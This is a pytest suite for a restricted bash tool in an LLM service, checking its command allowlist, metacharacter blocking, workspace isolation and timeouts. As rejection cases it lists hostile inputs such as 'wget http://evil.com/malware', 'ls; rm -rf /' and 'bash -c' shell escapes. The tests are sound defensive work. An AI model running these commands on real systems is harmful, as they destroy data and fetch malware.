"""
Test suite for Bash Executor Tool with security constraints.

Tests command allowlist, metacharacter rejection, session isolation, and timeout handling.
"""

import asyncio
import os
import pytest
from pathlib import Path
from unittest.mock import patch, AsyncMock

from llm_service.tools.builtin.bash_executor import BashExecutorTool


class TestBashExecutorMetadata:
    """Test BashExecutorTool metadata"""

    @pytest.fixture
    def tool(self):
        return BashExecutorTool()

    def test_tool_name(self, tool):
        """Test tool name is bash"""
        assert tool.metadata.name == "bash"

    def test_tool_is_dangerous(self, tool):
        """Test tool is marked as dangerous"""
        assert tool.metadata.dangerous is True

    def test_tool_is_session_aware(self, tool):
        """Test tool is session aware"""
        assert tool.metadata.session_aware is True

    def test_tool_requires_auth(self, tool):
        """Test tool requires authentication"""
        assert tool.metadata.requires_auth is True


class TestCommandAllowlist:
    """Test command allowlist enforcement"""

    @pytest.fixture
    def tool(self):
        return BashExecutorTool()

    @pytest.mark.asyncio
    async def test_allowed_command_ls(self, tool, tmp_path):
        """Test that 'ls' is allowed"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls",
            )

        # Should execute successfully (may have empty output if workspace is empty)
        assert result.success is True or "exit_code" in str(result.output)

    @pytest.mark.asyncio
    async def test_allowed_command_echo(self, tool, tmp_path):
        """Test that 'echo' is allowed"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="echo hello",
            )

        assert result.success is True
        assert "hello" in result.output["stdout"]

    @pytest.mark.asyncio
    async def test_disallowed_command_rejected(self, tool, tmp_path):
        """Test that non-allowlisted commands are rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="curl http://example.com",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_disallowed_command_wget(self, tool, tmp_path):
        """Test that wget is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="wget http://evil.com/malware",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_disallowed_command_bash(self, tool, tmp_path):
        """Test that bash itself is not in allowlist (prevent shell escape)"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="bash -c 'echo pwned'",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()


class TestMetacharacterBlocking:
    """Test shell metacharacter rejection"""

    @pytest.fixture
    def tool(self):
        return BashExecutorTool()

    @pytest.mark.asyncio
    async def test_pipe_rejected(self, tool, tmp_path):
        """Test that pipe is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls | cat",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_semicolon_rejected(self, tool, tmp_path):
        """Test that semicolon is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls; rm -rf /",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_and_operator_rejected(self, tool, tmp_path):
        """Test that && is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls && echo pwned",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_or_operator_rejected(self, tool, tmp_path):
        """Test that || is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls || echo fallback",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_redirect_out_rejected(self, tool, tmp_path):
        """Test that > is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="echo data > file.txt",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_redirect_in_rejected(self, tool, tmp_path):
        """Test that < is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="cat < file.txt",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_command_substitution_rejected(self, tool, tmp_path):
        """Test that $() is rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="echo $(whoami)",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_backtick_substitution_rejected(self, tool, tmp_path):
        """Test that backticks are rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="echo `whoami`",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_newline_rejected(self, tool, tmp_path):
        """Test that newlines are rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls\nrm -rf /",
            )

        assert result.success is False
        assert "not allowed" in result.error.lower()


class TestSessionWorkspace:
    """Test session workspace isolation"""

    @pytest.fixture
    def tool(self):
        return BashExecutorTool()

    @pytest.mark.asyncio
    async def test_command_runs_in_session_workspace(self, tool, tmp_path):
        """Test that command runs in session workspace directory"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test-session"},
                command="pwd",
            )

        assert result.success is True
        assert "test-session" in result.output["stdout"]
        assert result.metadata["working_dir"] == str(tmp_path / "test-session")

    @pytest.mark.asyncio
    async def test_session_workspace_created_automatically(self, tool, tmp_path):
        """Test that session workspace is created if it doesn't exist"""
        session_id = "new-session-abc"
        workspace_path = tmp_path / session_id

        assert not workspace_path.exists()

        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": session_id},
                command="ls",
            )

        assert workspace_path.exists()


class TestTimeoutHandling:
    """Test timeout enforcement"""

    @pytest.fixture
    def tool(self):
        return BashExecutorTool()

    @pytest.mark.asyncio
    async def test_timeout_is_enforced(self, tool, tmp_path):
        """Test that long-running commands are terminated"""
        # Create a Python script that sleeps in the session workspace
        session_dir = tmp_path / "test"
        session_dir.mkdir(exist_ok=True)
        sleep_script = session_dir / "sleep.py"
        sleep_script.write_text("import time\ntime.sleep(10)\nprint('done')")

        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="python3 sleep.py",
                timeout=1,
            )

        # Should timeout and fail
        assert result.success is False
        assert "timed out" in result.error.lower()


class TestErrorHandling:
    """Test error handling"""

    @pytest.fixture
    def tool(self):
        return BashExecutorTool()

    @pytest.mark.asyncio
    async def test_empty_command_rejected(self, tool, tmp_path):
        """Test that empty commands are rejected"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="",
            )

        assert result.success is False
        assert "empty" in result.error.lower()

    @pytest.mark.asyncio
    async def test_invalid_quoting_handled(self, tool, tmp_path):
        """Test that invalid quoting is handled gracefully"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="echo 'unclosed quote",
            )

        assert result.success is False
        assert "quoting" in result.error.lower()

    @pytest.mark.asyncio
    async def test_command_not_found(self, tool, tmp_path):
        """Test handling of commands that don't exist in PATH"""
        # First we need a command that's in our allowlist but doesn't exist
        # We'll patch the ALLOWED_BINARIES temporarily
        tool.ALLOWED_BINARIES = {"nonexistent_binary_xyz"}

        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="nonexistent_binary_xyz",
            )

        assert result.success is False
        assert "not found" in result.error.lower()


class TestOutputCapture:
    """Test stdout/stderr capture"""

    @pytest.fixture
    def tool(self):
        return BashExecutorTool()

    @pytest.mark.asyncio
    async def test_stdout_captured(self, tool, tmp_path):
        """Test that stdout is captured"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="echo 'hello stdout'",
            )

        assert result.success is True
        assert "hello stdout" in result.output["stdout"]

    @pytest.mark.asyncio
    async def test_stderr_captured(self, tool, tmp_path):
        """Test that stderr is captured for failing commands"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls /nonexistent_directory_xyz",
            )

        assert result.success is False
        assert result.output["stderr"] != "" or result.output["exit_code"] != 0

    @pytest.mark.asyncio
    async def test_exit_code_captured(self, tool, tmp_path):
        """Test that exit code is captured"""
        with patch.dict(
            os.environ, {"SHANNON_SESSION_WORKSPACES_DIR": str(tmp_path)}
        ):
            # Successful command
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="echo ok",
            )
            assert result.output["exit_code"] == 0

            # Failing command
            result = await tool._execute_impl(
                session_context={"session_id": "test"},
                command="ls /nonexistent_xyz",
            )
            assert result.output["exit_code"] != 0
